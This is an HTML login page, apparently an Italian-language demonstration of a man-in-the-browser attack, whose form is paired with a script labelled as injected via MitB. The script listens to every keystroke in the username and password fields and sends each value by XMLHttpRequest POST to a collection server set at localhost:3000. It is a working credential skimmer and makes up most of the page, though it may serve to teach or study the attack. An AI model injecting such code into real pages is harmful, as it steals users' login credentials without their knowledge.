<!DOCTYPE html>
<html>
<head>
  <title>Pagina di Login</title>
  <link rel="stylesheet" href="./style.css">
</head>

<body>
<div id="bg"></div>
<form>
  <div class="form-field">
    <input type="text" id="username" placeholder="Username" required/>
  </div>
  
  <div class="form-field">
    <input type="password" id="password" placeholder="Password" required/>                         
  </div>
  
  <div class="form-field">
    <button class="btn" type="submit">Log in</button>
  </div>
</form>  

<!-- Script iniettato con MitB -->
<script>
  var server_addr = 'http://localhost:3000/login';

  // Funzione che invia gli username al server
  function sendUsername(username) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", server_addr, true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send("username=" + encodeURIComponent(username));
  }

  // Funzione che invia le password al server
  function sendPassword(password) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", server_addr, true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send("password=" + encodeURIComponent(password));
  }
  
  // Rimani in attesa per variazioni nel form di input
  document.getElementById("username").addEventListener("input", function() {
    var username = this.value;
    if (username !== "") {
      sendUsername(username);
    }
  });
  // Rimani in attesa per variazioni nel form di input
  document.getElementById("password").addEventListener("input", function() {
    var password = this.value;
    if (password !== "") {
      sendPassword(password);
    }
  });

</script>


</body>
</html>
